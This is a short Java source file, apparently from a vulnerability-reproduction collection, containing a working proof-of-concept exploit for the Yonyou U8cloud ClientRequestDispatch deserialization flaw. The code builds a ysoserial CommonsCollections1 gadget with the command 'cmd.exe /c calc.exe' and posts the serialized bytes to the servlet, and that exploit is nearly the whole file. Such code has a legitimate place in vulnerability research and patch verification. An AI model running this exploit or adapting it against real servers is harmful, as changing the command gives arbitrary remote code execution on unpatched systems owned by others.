package cve.u8cloud;

import com.pacemrc.vuldebug.common.utils.basic.ObjectUtil;
import com.pacemrc.vuldebug.common.utils.http.HttpRequest;
import org.apache.http.client.methods.HttpPost;
import ysoserial.payloads.ObjectPayload;

/**
 * 漏洞：
 * U8cloud所有版本ClientRequestDispatch反序列化漏洞
 * https://security.yonyou.com/#/patchInfo?foreignKey=33a417377013454099efa313fc9fcf89
 */
public class ClientRequestDispatch_deserialize {


    public static void main(String[] args) throws Exception {

        String url = "http://10.58.120.201:8088/servlet/~iufo/nc.ui.iufo.jiuqi.ClientRequestDispatch";
        String gadget = "CommonsCollections1";
        String cmd = "cmd.exe /c calc.exe";
        ObjectPayload<?> payload = (ObjectPayload) Class.forName("ysoserial.payloads." + gadget).newInstance();
        Object obj = payload.getObject(cmd);

        byte[] bytes = ObjectUtil.getByte(obj);

        HttpRequest httpRequest = new HttpRequest();
        HttpPost httpPost = new HttpPost(url);
        httpRequest.sendByteArrayPost(httpPost, bytes);

    }
}


